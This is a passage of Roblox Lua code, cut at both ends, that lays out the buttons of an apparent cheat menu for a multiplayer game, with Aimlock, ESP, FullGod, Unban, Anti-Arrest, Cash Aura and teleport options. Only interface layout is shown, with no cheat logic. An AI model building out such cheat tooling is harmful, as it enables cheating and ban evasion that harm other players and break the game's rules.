Sewer.Size = UDim2.new(0, 94, 0, 46)
Sewer.Font = Enum.Font.GothamBlack
Sewer.Text = "Sewer"
Sewer.TextColor3 = Color3.fromRGB(255, 255, 255)
Sewer.TextSize = 14.000

Playground.Name = "Playground"
Playground.Parent = QuickTpFrame
Playground.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Playground.BorderSizePixel = 0
Playground.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
Playground.Size = UDim2.new(0, 94, 0, 46)
Playground.Font = Enum.Font.GothamBlack
Playground.Text = "Playground"
Playground.TextColor3 = Color3.fromRGB(255, 255, 255)
Playground.TextSize = 14.000

GasStation.Name = "GasStation"
GasStation.Parent = QuickTpFrame
GasStation.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GasStation.BorderSizePixel = 0
GasStation.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
GasStation.Size = UDim2.new(0, 94, 0, 46)
GasStation.Font = Enum.Font.GothamBlack
GasStation.Text = "GasStation"
GasStation.TextColor3 = Color3.fromRGB(255, 255, 255)
GasStation.TextSize = 14.000

LavaBase.Name = "LavaBase"
LavaBase.Parent = QuickTpFrame
LavaBase.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LavaBase.BorderSizePixel = 0
LavaBase.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
LavaBase.Size = UDim2.new(0, 94, 0, 46)
LavaBase.Font = Enum.Font.GothamBlack
LavaBase.Text = "Admin Base"
LavaBase.TextColor3 = Color3.fromRGB(255, 255, 255)
LavaBase.TextSize = 14.000

SavePos.Name = "SavePos"
SavePos.Parent = QuickTpFrame
SavePos.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SavePos.BorderSizePixel = 0
SavePos.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
SavePos.Size = UDim2.new(0, 94, 0, 46)
SavePos.Font = Enum.Font.GothamBlack
SavePos.Text = "SavePos"
SavePos.TextColor3 = Color3.fromRGB(255, 255, 255)
SavePos.TextSize = 14.000

SafeZone2.Name = "SafeZone2"
SafeZone2.Parent = QuickTpFrame
SafeZone2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SafeZone2.BorderSizePixel = 0
SafeZone2.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
SafeZone2.Size = UDim2.new(0, 94, 0, 46)
SafeZone2.Font = Enum.Font.GothamBlack
SafeZone2.Text = "Safe Zone #2"
SafeZone2.TextColor3 = Color3.fromRGB(255, 255, 255)
SafeZone2.TextSize = 14.000

UFO.Name = "UFO"
UFO.Parent = QuickTpFrame
UFO.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
UFO.BorderSizePixel = 0
UFO.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
UFO.Size = UDim2.new(0, 94, 0, 46)
UFO.Font = Enum.Font.GothamBlack
UFO.Text = "UFO"
UFO.TextColor3 = Color3.fromRGB(255, 255, 255)
UFO.TextSize = 14.000

TacoShop.Name = "TacoShop"
TacoShop.Parent = QuickTpFrame
TacoShop.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
TacoShop.BorderSizePixel = 0
TacoShop.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
TacoShop.Size = UDim2.new(0, 94, 0, 46)
TacoShop.Font = Enum.Font.GothamBlack
TacoShop.Text = "TacoShop"
TacoShop.TextColor3 = Color3.fromRGB(255, 255, 255)
TacoShop.TextSize = 14.000

LoadPos.Name = "LoadPos"
LoadPos.Parent = QuickTpFrame
LoadPos.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LoadPos.BorderSizePixel = 0
LoadPos.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
LoadPos.Size = UDim2.new(0, 94, 0, 46)
LoadPos.Font = Enum.Font.GothamBlack
LoadPos.Text = "LoadPos"
LoadPos.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadPos.TextSize = 14.000

GunShop1.Name = "GunShop1"
GunShop1.Parent = QuickTpFrame
GunShop1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GunShop1.BorderSizePixel = 0
GunShop1.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
GunShop1.Size = UDim2.new(0, 94, 0, 46)
GunShop1.Font = Enum.Font.GothamBlack
GunShop1.Text = "GunShop(AK)"
GunShop1.TextColor3 = Color3.fromRGB(255, 255, 255)
GunShop1.TextSize = 14.000

SideScriptsFrame.Name = "SideScriptsFrame"
SideScriptsFrame.Parent = Buttons
SideScriptsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SideScriptsFrame.BackgroundTransparency = 1.000
SideScriptsFrame.Size = UDim2.new(0, 316, 0, 325)
SideScriptsFrame.Visible = false

Aimlock.Name = "Aimlock"
Aimlock.Parent = SideScriptsFrame
Aimlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Aimlock.BorderSizePixel = 0
Aimlock.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
Aimlock.Size = UDim2.new(0, 94, 0, 46)
Aimlock.Font = Enum.Font.GothamBlack
Aimlock.Text = "Aimlock"
Aimlock.TextColor3 = Color3.fromRGB(255, 255, 255)
Aimlock.TextSize = 14.000

Users.Name = "Users"
Users.Parent = SideScriptsFrame
Users.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Users.BorderSizePixel = 0
Users.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
Users.Size = UDim2.new(0, 94, 0, 46)
Users.Font = Enum.Font.GothamBlack
Users.Text = "Users"
Users.TextColor3 = Color3.fromRGB(255, 255, 255)
Users.TextSize = 14.000

MoneyESP.Name = "MoneyESP"
MoneyESP.Parent = SideScriptsFrame
MoneyESP.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MoneyESP.BorderSizePixel = 0
MoneyESP.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
MoneyESP.Size = UDim2.new(0, 94, 0, 46)
MoneyESP.Font = Enum.Font.GothamBlack
MoneyESP.Text = "MoneyESP"
MoneyESP.TextColor3 = Color3.fromRGB(255, 255, 255)
MoneyESP.TextSize = 14.000

FullGod.Name = "FullGod"
FullGod.Parent = SideScriptsFrame
FullGod.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FullGod.BorderSizePixel = 0
FullGod.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
FullGod.Size = UDim2.new(0, 94, 0, 46)
FullGod.Font = Enum.Font.GothamBlack
FullGod.Text = "FullGod"
FullGod.TextColor3 = Color3.fromRGB(255, 255, 255)
FullGod.TextSize = 14.000

Autofarm.Name = "Autofarm"
Autofarm.Parent = SideScriptsFrame
Autofarm.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Autofarm.BorderSizePixel = 0
Autofarm.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
Autofarm.Size = UDim2.new(0, 94, 0, 46)
Autofarm.Font = Enum.Font.GothamBlack
Autofarm.Text = "Autofarm"
Autofarm.TextColor3 = Color3.fromRGB(255, 255, 255)
Autofarm.TextSize = 14.000

HighTool.Name = "HighTool"
HighTool.Parent = SideScriptsFrame
HighTool.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
HighTool.BorderSizePixel = 0
HighTool.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
HighTool.Size = UDim2.new(0, 94, 0, 46)
HighTool.Font = Enum.Font.GothamBlack
HighTool.Text = "High Tool"
HighTool.TextColor3 = Color3.fromRGB(255, 255, 255)
HighTool.TextSize = 14.000

Esp.Name = "Esp"
Esp.Parent = SideScriptsFrame
Esp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Esp.BorderSizePixel = 0
Esp.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
Esp.Size = UDim2.new(0, 94, 0, 46)
Esp.Font = Enum.Font.GothamBlack
Esp.Text = "Esp"
Esp.TextColor3 = Color3.fromRGB(255, 255, 255)
Esp.TextSize = 14.000

LastingBullets.Name = "LastingBullets"
LastingBullets.Parent = SideScriptsFrame
LastingBullets.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LastingBullets.BorderSizePixel = 0
LastingBullets.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
LastingBullets.Size = UDim2.new(0, 94, 0, 46)
LastingBullets.Font = Enum.Font.GothamBlack
LastingBullets.Text = "LastingBullets"
LastingBullets.TextColor3 = Color3.fromRGB(255, 255, 255)
LastingBullets.TextSize = 14.000

GrenadeLock.Name = "GrenadeLock"
GrenadeLock.Parent = SideScriptsFrame
GrenadeLock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GrenadeLock.BorderSizePixel = 0
GrenadeLock.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
GrenadeLock.Size = UDim2.new(0, 94, 0, 46)
GrenadeLock.Font = Enum.Font.GothamBlack
GrenadeLock.Text = "GrenadeLock"
GrenadeLock.TextColor3 = Color3.fromRGB(255, 255, 255)
GrenadeLock.TextSize = 14.000

Spin.Name = "Spin"
Spin.Parent = SideScriptsFrame
Spin.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Spin.BorderSizePixel = 0
Spin.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
Spin.Size = UDim2.new(0, 94, 0, 46)
Spin.Font = Enum.Font.GothamBlack
Spin.Text = "Spin"
Spin.TextColor3 = Color3.fromRGB(255, 255, 255)
Spin.TextSize = 14.000

Unban.Name = "Unban"
Unban.Parent = SideScriptsFrame
Unban.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Unban.BorderSizePixel = 0
Unban.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
Unban.Size = UDim2.new(0, 94, 0, 46)
Unban.Font = Enum.Font.GothamBlack
Unban.Text = "Unban"
Unban.TextColor3 = Color3.fromRGB(255, 255, 255)
Unban.TextSize = 14.000

TaserLock.Name = "TaserLock"
TaserLock.Parent = SideScriptsFrame
TaserLock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
TaserLock.BorderSizePixel = 0
TaserLock.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
TaserLock.Size = UDim2.new(0, 94, 0, 46)
TaserLock.Font = Enum.Font.GothamBlack
TaserLock.Text = "TaserLock"
TaserLock.TextColor3 = Color3.fromRGB(255, 255, 255)
TaserLock.TextSize = 14.000

RpgLock.Name = "RpgLock"
RpgLock.Parent = SideScriptsFrame
RpgLock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
RpgLock.BorderSizePixel = 0
RpgLock.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
RpgLock.Size = UDim2.new(0, 94, 0, 46)
RpgLock.Font = Enum.Font.GothamBlack
RpgLock.Text = "RpgLock"
RpgLock.TextColor3 = Color3.fromRGB(255, 255, 255)
RpgLock.TextSize = 14.000

Invisible.Name = "Invisible"
Invisible.Parent = SideScriptsFrame
Invisible.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Invisible.BorderSizePixel = 0
Invisible.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
Invisible.Size = UDim2.new(0, 94, 0, 46)
Invisible.Font = Enum.Font.GothamBlack
Invisible.Text = "Invisible"
Invisible.TextColor3 = Color3.fromRGB(255, 255, 255)
Invisible.TextSize = 14.000

InfTools.Name = "InfTools"
InfTools.Parent = SideScriptsFrame
InfTools.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
InfTools.BorderSizePixel = 0
InfTools.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
InfTools.Size = UDim2.new(0, 94, 0, 46)
InfTools.Font = Enum.Font.GothamBlack
InfTools.Text = "InfTools"
InfTools.TextColor3 = Color3.fromRGB(255, 255, 255)
InfTools.TextSize = 14.000

TogglesFrame.Name = "TogglesFrame"
TogglesFrame.Parent = Buttons
TogglesFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TogglesFrame.BackgroundTransparency = 1.000
TogglesFrame.Size = UDim2.new(0, 316, 0, 325)
TogglesFrame.Visible = false

QToTp.Name = "QToTp"
QToTp.Parent = TogglesFrame
QToTp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
QToTp.BorderSizePixel = 0
QToTp.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
QToTp.Size = UDim2.new(0, 94, 0, 46)
QToTp.Font = Enum.Font.GothamBlack
QToTp.Text = "Q to TP"
QToTp.TextColor3 = Color3.fromRGB(255, 255, 255)
QToTp.TextSize = 14.000

QToTpColor.Name = "QToTpColor"
QToTpColor.Parent = QToTp
QToTpColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
QToTpColor.BorderSizePixel = 0
QToTpColor.Size = UDim2.new(0, 93, 0, 5)
QToTpColor.Font = Enum.Font.SourceSans
QToTpColor.Text = ""
QToTpColor.TextColor3 = Color3.fromRGB(255, 0, 0)
QToTpColor.TextSize = 14.000

HideBlock.Name = "HideBlock"
HideBlock.Parent = TogglesFrame
HideBlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
HideBlock.BorderSizePixel = 0
HideBlock.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
HideBlock.Size = UDim2.new(0, 94, 0, 46)
HideBlock.Font = Enum.Font.GothamBlack
HideBlock.Text = "Hide Block"
HideBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
HideBlock.TextSize = 14.000

HideBlockColor.Name = "HideBlockColor"
HideBlockColor.Parent = HideBlock
HideBlockColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HideBlockColor.BorderSizePixel = 0
HideBlockColor.Size = UDim2.new(0, 93, 0, 5)
HideBlockColor.Font = Enum.Font.SourceSans
HideBlockColor.Text = ""
HideBlockColor.TextColor3 = Color3.fromRGB(255, 0, 0)
HideBlockColor.TextSize = 14.000

HideUser.Name = "HideUser"
HideUser.Parent = TogglesFrame
HideUser.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
HideUser.BorderSizePixel = 0
HideUser.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
HideUser.Size = UDim2.new(0, 94, 0, 46)
HideUser.Font = Enum.Font.GothamBlack
HideUser.Text = "Hide User"
HideUser.TextColor3 = Color3.fromRGB(255, 255, 255)
HideUser.TextSize = 14.000

HideUserColor.Name = "HideUserColor"
HideUserColor.Parent = HideUser
HideUserColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HideUserColor.BorderSizePixel = 0
HideUserColor.Size = UDim2.new(0, 93, 0, 5)
HideUserColor.Font = Enum.Font.SourceSans
HideUserColor.Text = ""
HideUserColor.TextColor3 = Color3.fromRGB(255, 0, 0)
HideUserColor.TextSize = 14.000

AutoStomp.Name = "AutoStomp"
AutoStomp.Parent = TogglesFrame
AutoStomp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AutoStomp.BorderSizePixel = 0
AutoStomp.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
AutoStomp.Size = UDim2.new(0, 94, 0, 46)
AutoStomp.Font = Enum.Font.GothamBlack
AutoStomp.Text = "Auto Stomp"
AutoStomp.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoStomp.TextSize = 14.000

AutoStompColor.Name = "AutoStompColor"
AutoStompColor.Parent = AutoStomp
AutoStompColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoStompColor.BorderSizePixel = 0
AutoStompColor.Size = UDim2.new(0, 93, 0, 5)
AutoStompColor.Font = Enum.Font.SourceSans
AutoStompColor.Text = ""
AutoStompColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AutoStompColor.TextSize = 14.000

RocketRide.Name = "RocketRide"
RocketRide.Parent = TogglesFrame
RocketRide.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
RocketRide.BorderSizePixel = 0
RocketRide.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
RocketRide.Size = UDim2.new(0, 94, 0, 46)
RocketRide.Font = Enum.Font.GothamBlack
RocketRide.Text = "Rocket Ride"
RocketRide.TextColor3 = Color3.fromRGB(255, 255, 255)
RocketRide.TextSize = 14.000

RocketRideColor.Name = "RocketRideColor"
RocketRideColor.Parent = RocketRide
RocketRideColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
RocketRideColor.BorderSizePixel = 0
RocketRideColor.Size = UDim2.new(0, 93, 0, 5)
RocketRideColor.Font = Enum.Font.SourceSans
RocketRideColor.Text = ""
RocketRideColor.TextColor3 = Color3.fromRGB(255, 0, 0)
RocketRideColor.TextSize = 14.000

AntiArrest.Name = "AntiArrest"
AntiArrest.Parent = TogglesFrame
AntiArrest.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiArrest.BorderSizePixel = 0
AntiArrest.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
AntiArrest.Size = UDim2.new(0, 94, 0, 46)
AntiArrest.Font = Enum.Font.GothamBlack
AntiArrest.Text = "Anti-Arrest"
AntiArrest.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiArrest.TextSize = 14.000

AntiArrestColor.Name = "AntiArrestColor"
AntiArrestColor.Parent = AntiArrest
AntiArrestColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiArrestColor.BorderSizePixel = 0
AntiArrestColor.Size = UDim2.new(0, 93, 0, 5)
AntiArrestColor.Font = Enum.Font.SourceSans
AntiArrestColor.Text = ""
AntiArrestColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiArrestColor.TextSize = 14.000

AntiGrab.Name = "AntiGrab"
AntiGrab.Parent = TogglesFrame
AntiGrab.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiGrab.BorderSizePixel = 0
AntiGrab.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
AntiGrab.Size = UDim2.new(0, 94, 0, 46)
AntiGrab.Font = Enum.Font.GothamBlack
AntiGrab.Text = "Anti-Grab"
AntiGrab.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiGrab.TextSize = 14.000

AntiGrabColor.Name = "AntiGrabColor"
AntiGrabColor.Parent = AntiGrab
AntiGrabColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiGrabColor.BorderSizePixel = 0
AntiGrabColor.Size = UDim2.new(0, 93, 0, 5)
AntiGrabColor.Font = Enum.Font.SourceSans
AntiGrabColor.Text = ""
AntiGrabColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiGrabColor.TextSize = 14.000

AutoDrop.Name = "AutoDrop"
AutoDrop.Parent = TogglesFrame
AutoDrop.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AutoDrop.BorderSizePixel = 0
AutoDrop.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
AutoDrop.Size = UDim2.new(0, 94, 0, 46)
AutoDrop.Font = Enum.Font.GothamBlack
AutoDrop.Text = "Auto Drop"
AutoDrop.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoDrop.TextSize = 14.000

AutoDropColor.Name = "AutoDropColor"
AutoDropColor.Parent = AutoDrop
AutoDropColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoDropColor.BorderSizePixel = 0
AutoDropColor.Size = UDim2.new(0, 93, 0, 5)
AutoDropColor.Font = Enum.Font.SourceSans
AutoDropColor.Text = ""
AutoDropColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AutoDropColor.TextSize = 14.000

AntiStomp.Name = "AntiStomp"
AntiStomp.Parent = TogglesFrame
AntiStomp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiStomp.BorderSizePixel = 0
AntiStomp.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
AntiStomp.Size = UDim2.new(0, 94, 0, 46)
AntiStomp.Font = Enum.Font.GothamBlack
AntiStomp.Text = "Anti-Stomp"
AntiStomp.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiStomp.TextSize = 14.000

AntiStompColor.Name = "AntiStompColor"
AntiStompColor.Parent = AntiStomp
AntiStompColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiStompColor.BorderSizePixel = 0
AntiStompColor.Size = UDim2.new(0, 93, 0, 5)
AntiStompColor.Font = Enum.Font.SourceSans
AntiStompColor.Text = ""
AntiStompColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiStompColor.TextSize = 14.000

AutoBlock.Name = "AutoBlock"
AutoBlock.Parent = TogglesFrame
AutoBlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AutoBlock.BorderSizePixel = 0
AutoBlock.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
AutoBlock.Size = UDim2.new(0, 94, 0, 46)
AutoBlock.Font = Enum.Font.GothamBlack
AutoBlock.Text = "Auto Block"
AutoBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoBlock.TextSize = 14.000

AutoBlockColor.Name = "AutoBlockColor"
AutoBlockColor.Parent = AutoBlock
AutoBlockColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoBlockColor.BorderSizePixel = 0
AutoBlockColor.Size = UDim2.new(0, 93, 0, 5)
AutoBlockColor.Font = Enum.Font.SourceSans
AutoBlockColor.Text = ""
AutoBlockColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AutoBlockColor.TextSize = 14.000

CashAura.Name = "CashAura"
CashAura.Parent = TogglesFrame
CashAura.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CashAura.BorderSizePixel = 0
CashAura.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
CashAura.Size = UDim2.new(0, 94, 0, 46)
CashAura.Font = Enum.Font.GothamBlack
CashAura.Text = "Cash Aura"
CashAura.TextColor3 = Color3.fromRGB(255, 255, 255)
CashAura.TextSize = 14.000

CashAuraColor.Name = "CashAuraColor"
CashAuraColor.Parent = CashAura
CashAuraColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CashAuraColor.BorderSizePixel = 0
CashAuraColor.Size = UDim2.new(0, 93, 0, 5)
CashAuraColor.Font = Enum.Font.SourceSans
CashAuraColor.Text = ""
CashAuraColor.TextColor3 = Color3.fromRGB(255, 0, 0)
CashAuraColor.TextSize = 14.000

AntiEffects.Name = "AntiEffects"
AntiEffects.Parent = TogglesFrame
AntiEffects.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiEffects.BorderSizePixel = 0
AntiEffects.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
AntiEffects.Size = UDim2.new(0, 94, 0, 46)
AntiEffects.Font = Enum.Font.GothamBlack
AntiEffects.Text = "Anti-Effects"
AntiEffects.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiEffects.TextSize = 14.000

AntiEffectsColor.Name = "AntiEffectsColor"
AntiEffectsColor.Parent = AntiEffects
AntiEffectsColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiEffectsColor.BorderSizePixel = 0
AntiEffectsColor.Size = UDim2.new(0, 93, 0, 5)
AntiEffectsColor.Font = Enum.Font.SourceSans
AntiEffectsColor.Text = ""
AntiEffectsColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiEffectsColor.TextSize = 14.000

AltArmor.Name = "AltArmor"
AltArmor.Parent = TogglesFrame
AltArmor.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AltArmor.BorderSizePixel = 0
AltArmor.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
AltArmor.Size = UDim2.new(0, 94, 0, 46)
AltArmor.Font = Enum.Font.GothamBlack
AltArmor.Text = "Alt Armor"
AltArmor.TextColor3 = Color3.fromRGB(255, 255, 255)
AltArmor.TextSize = 14.000

AltArmorColor.Name = "AltArmorColor"
AltArmorColor.Parent = AltArmor
AltArmorColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AltArmorColor.BorderSizePixel = 0
AltArmorColor.Size = UDim2.new(0, 93, 0, 5)
AltArmorColor.Font = Enum.Font.SourceSans
AltArmorColor.Text = ""
AltArmorColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AltArmorColor.TextSize = 14.000

AntiBag.Name = "AntiBag"
AntiBag.Parent = TogglesFrame
AntiBag.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiBag.BorderSizePixel = 0
AntiBag.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
AntiBag.Size = UDim2.new(0, 94, 0, 46)
AntiBag.Font = Enum.Font.GothamBlack
AntiBag.Text = "Anti-Bag"
AntiBag.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiBag.TextSize = 14.000

AntiBagColor.Name = "AntiBagColor"
AntiBagColor.Parent = AntiBag
AntiBagColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiBagColor.BorderSizePixel = 0
AntiBagColor.Size = UDim2.new(0, 93, 0, 5)
AntiBagColor.Font = Enum.Font.SourceSans
AntiBagColor.Text = ""
AntiBagColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiBagColor.TextSize = 14.000

AntiSlow.Name = "AntiSlow"
AntiSlow.Parent = TogglesFrame
AntiSlow.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiSlow.BorderSizePixel = 0
AntiSlow.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
AntiSlow.Size = UDim2.new(0, 94, 0, 46)
AntiSlow.Font = Enum.Font.GothamBlack
AntiSlow.Text = "Anti-Slow"
AntiSlow.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiSlow.TextSize = 14.000

AntiSlowColor.Name = "AntiSlowColor"
AntiSlowColor.Parent = AntiSlow
AntiSlowColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiSlowColor.BorderSizePixel = 0
AntiSlowColor.Size = UDim2.new(0, 93, 0, 5)
AntiSlowColor.Font = Enum.Font.SourceSans
AntiSlowColor.Text = ""
AntiSlowColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiSlowColor.TextSize = 14.000

SellingFrame.Name = "SellingFrame"
SellingFrame.Parent = Buttons
SellingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SellingFrame.BackgroundTransparency = 1.000
SellingFrame.Size = UDim2.new(0, 316, 0, 325)
SellingFrame.Visible = false

CashTextbox.Name = "CashTextbox"
CashTextbox.Parent = SellingFrame
CashTextbox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CashTextbox.BorderSizePixel = 0
CashTextbox.Position = UDim2.new(0.0949367061, 0, 0.212307692, 0)
CashTextbox.Size = UDim2.new(0, 257, 0, 34)
CashTextbox.Font = Enum.Font.SourceSans
CashTextbox.PlaceholderText = "INSERT MONEY AMOUNT"
CashTextbox.Text = ""
CashTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
CashTextbox.TextSize = 14.000

CashDropperTitle.Name = "CashDropperTitle"
CashDropperTitle.Parent = SellingFrame
CashDropperTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashDropperTitle.BackgroundTransparency = 1.000
CashDropperTitle.Position = UDim2.new(0.158227861, 0, 0.0276923068, 0)
CashDropperTitle.Size = UDim2.new(0, 217, 0, 26)
CashDropperTitle.Font = Enum.Font.LuckiestGuy
CashDropperTitle.Text = "CASH DROPPER"
CashDropperTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
CashDropperTitle.TextSize = 30.000

CalculateButton.Name = "CalculateButton"
CalculateButton.Parent = SellingFrame
CalculateButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CalculateButton.BorderSizePixel = 0
CalculateButton.Position = UDim2.new(0.0949367136, 0, 0.369230747, 0)
CalculateButton.Size = UDim2.new(0, 118, 0, 27)
CalculateButton.Font = Enum.Font.GothamBlack
CalculateButton.Text = "Calculate"
CalculateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CalculateButton.TextSize = 14.000

DropToggleButton.Name = "DropToggleButton"
DropToggleButton.Parent = SellingFrame
DropToggleButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
DropToggleButton.BorderSizePixel = 0
DropToggleButton.Position = UDim2.new(0.532544494, 0, 0.369230747, 0)
DropToggleButton.Size = UDim2.new(0, 118, 0, 27)
DropToggleButton.Font = Enum.Font.GothamBlack
DropToggleButton.Text = "Enable"
DropToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DropToggleButton.TextSize = 14.000

CashDroppedLabel.Name = "CashDroppedLabel"
CashDroppedLabel.Parent = SellingFrame
CashDroppedLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashDroppedLabel.BackgroundTransparency = 1.000
CashDroppedLabel.Position = UDim2.new(0.0949367136, 0, 0.596923113, 0)
CashDroppedLabel.Size = UDim2.new(0, 200, 0, 12)
CashDroppedLabel.Font = Enum.Font.GothamBlack
CashDroppedLabel.Text = "Cash Dropped:"
CashDroppedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CashDroppedLabel.TextSize = 14.000
CashDroppedLabel.TextXAlignment = Enum.TextXAlignment.Left

CashAtEndLabel.Name = "CashAtEndLabel"
CashAtEndLabel.Parent = SellingFrame
CashAtEndLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashAtEndLabel.BackgroundTransparency = 1.000
CashAtEndLabel.Position = UDim2.new(0.0949367136, 0, 0.698461592, 0)
CashAtEndLabel.Size = UDim2.new(0, 200, 0, 12)
CashAtEndLabel.Font = Enum.Font.GothamBlack
CashAtEndLabel.Text = "Cash you will have left:"
CashAtEndLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CashAtEndLabel.TextSize = 14.000
CashAtEndLabel.TextXAlignment = Enum.TextXAlignment.Left

Frame_2.Parent = SellingFrame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.0949367061, 0, 0.769230783, 0)
